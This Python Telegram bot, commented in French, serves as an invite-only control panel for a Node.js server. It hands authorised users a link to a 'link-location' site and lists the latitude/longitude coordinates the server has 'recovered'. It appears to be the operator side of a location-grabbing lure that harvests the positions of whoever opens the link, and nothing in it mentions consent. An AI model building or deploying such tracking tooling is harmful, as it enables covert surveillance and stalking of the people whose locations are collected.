import os
import json
import secrets
import time
import requests
from dotenv import load_dotenv
from telegram import Update, ReplyKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes

# ============================
# 🔧 CONFIGURATION
# ============================
load_dotenv()
SERVER_URL = "http://localhost:3000"  # 🔁 ton serveur Node.js
TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")

if not TOKEN:
    print("❌ Variable d'environnement TELEGRAM_BOT_TOKEN manquante.")
    exit(1)

# ============================
# 🧠 FONCTIONS UTILITAIRES
# ============================

def is_user_authorized(user_id):
    """Vérifie si l'utilisateur est autorisé via le serveur Node.js"""
    try:
        response = requests.get(f"{SERVER_URL}/users")
        if response.status_code == 200:
            users = response.json()
            return any(user["id"] == user_id for user in users)
        else:
            print("Erreur serveur (users):", response.status_code)
            return False
    except Exception as e:
        print("Erreur connexion serveur:", e)
        return False


def add_authorized_user(user_id, username):
    """Ajoute un utilisateur via le serveur Node.js"""
    try:
        data = {
            "id": user_id,
            "username": username,
            "added_at": time.time()
        }
        response = requests.post(f"{SERVER_URL}/users", json=data)
        if response.status_code == 201:
            return True
        else:
            print("Erreur lors de l'ajout utilisateur:", response.text)
            return False
    except Exception as e:
        print("Erreur connexion serveur:", e)
        return False


def generate_invite_code():
    """Génère un code d'invitation unique"""
    return secrets.token_urlsafe(6)


# ============================
# 🤖 COMMANDES BOT
# ============================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username or update.effective_user.first_name

    # Vérifie si un code d'invitation est utilisé
    if context.args:
        code = context.args[0]
        try:
            response = requests.get(f"{SERVER_URL}/invitations")
            if response.status_code == 200:
                invitations = response.json()
                if code in invitations and not invitations[code].get("used", False):
                    if add_authorized_user(user_id, username):
                        # Marquer le code comme utilisé
                        used_data = {
                            "code": code,
                            "created_by": invitations[code]["created_by"],
                            "created_at": invitations[code]["created_at"],
                            "used": True,
                            "used_by": user_id,
                            "used_at": time.time()
                        }
                        requests.post(f"{SERVER_URL}/invitations", json=used_data)

                        keyboard = ReplyKeyboardMarkup([
                            ["Lien", "Image"],
                            ["Coordonnées récupéré"],
                            ["Inviter", "Stats"]
                        ], resize_keyboard=True)

                        await update.message.reply_text(
                            f"✅ Bienvenue {username} ! Vous avez été ajouté à la liste des utilisateurs autorisés.",
                            reply_markup=keyboard
                        )
                        return
                    else:
                        await update.message.reply_text("❌ Vous êtes déjà autorisé.")
                        return
                else:
                    await update.message.reply_text("⚠️ Code invalide ou déjà utilisé.")
                    return
        except Exception as e:
            await update.message.reply_text(f"Erreur de communication serveur: {e}")
            return

    # Vérifie l'autorisation normale
    if not is_user_authorized(user_id):
        await update.message.reply_text(
            "🚫 Accès refusé. Ce bot est restreint aux utilisateurs autorisés.\n"
            "Demandez un lien d’invitation à l’administrateur."
        )
        return

    keyboard = ReplyKeyboardMarkup([
        ["Lien", "Image"],
        ["Coordonnées récupéré"],
        ["Inviter", "Stats"]
    ], resize_keyboard=True)

    await update.message.reply_text(f"✅ Bienvenue {username} ! Bot démarré !", reply_markup=keyboard)


async def echo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text

    # Vérification d'autorisation
    if not is_user_authorized(user_id):
        await update.message.reply_text("🚫 Accès refusé. Vous n'êtes pas autorisé à utiliser ce bot.")
        return

    if text == "Lien":
        await update.message.reply_text("🔗 Lien : https://link-location.vercel.app/")
    elif text == "Image":
        await update.message.reply_text("🖼️ Image : https://example.com/image.jpg")
    elif text == "Coordonnées récupéré":
        try:
            response = requests.get(f"{SERVER_URL}/coords")
            if response.status_code == 200:
                coords = response.json()
                if not coords:
                    await update.message.reply_text("Aucune coordonnée disponible.")
                    return
                response_text = "**📍 Coordonnées récupérées :**\n\n"
                for c in coords:
                    response_text += f"- Latitude: {c['latitude']}, Longitude: {c['longitude']}\n"
                await update.message.reply_text(response_text)
            else:
                await update.message.reply_text("Erreur serveur lors de la récupération des coordonnées.")
        except Exception as e:
            await update.message.reply_text(f"Erreur de connexion au serveur: {e}")
    elif text == "Inviter":
        await invite(update, context)
    elif text == "Stats":
        await admin_stats(update, context)
    else:
        await update.message.reply_text("Commande non reconnue.")


async def invite(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    # Vérifie l'autorisation
    if not is_user_authorized(user_id):
        await update.message.reply_text("🚫 Vous n'êtes pas autorisé à créer des invitations.")
        return

    # Génère un nouveau code
    code = generate_invite_code()
    data = {
        "code": code,
        "created_by": user_id,
        "created_at": time.time(),
        "used": False
    }

    # Envoie au serveur Node.js
    try:
        requests.post(f"{SERVER_URL}/invitations", json=data)
    except Exception as e:
        await update.message.reply_text(f"Erreur lors de la génération du code: {e}")
        return

    bot_username = (await context.bot.get_me()).username
    invite_link = f"https://t.me/{bot_username}?start={code}"

    await update.message.reply_text(
        f"🔗 **Lien d'invitation généré :**\n\n"
        f"`{invite_link}`\n\n"
        f"Ce lien peut être utilisé **une seule fois**.\nCode: `{code}`",
        parse_mode="Markdown"
    )


async def admin_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    if not is_user_authorized(user_id):
        await update.message.reply_text("🚫 Accès refusé.")
        return

    try:
        users_res = requests.get(f"{SERVER_URL}/users")
        inv_res = requests.get(f"{SERVER_URL}/invitations")

        if users_res.status_code == 200 and inv_res.status_code == 200:
            users = users_res.json()
            invitations = inv_res.json()
            users_count = len(users)
            active_codes = sum(1 for c in invitations.values() if not c.get("used", False))
            used_codes = sum(1 for c in invitations.values() if c.get("used", False))

            await update.message.reply_text(
                f"📊 **Statistiques :**\n\n"
                f"👤 Utilisateurs autorisés : {users_count}\n"
                f"🟢 Codes actifs : {active_codes}\n"
                f"🔴 Codes utilisés : {used_codes}",
                parse_mode="Markdown"
            )
        else:
            await update.message.reply_text("Erreur lors de la récupération des statistiques.")
    except Exception as e:
        await update.message.reply_text(f"Erreur serveur: {e}")


# ============================
# 🚀 LANCEMENT DU BOT
# ============================

def main():
    app = ApplicationBuilder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("invite", invite))
    app.add_handler(CommandHandler("stats", admin_stats))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, echo))

    print("🤖 Bot connecté au serveur Node.js et prêt à fonctionner !")
    app.run_polling()


if __name__ == "__main__":
    main()
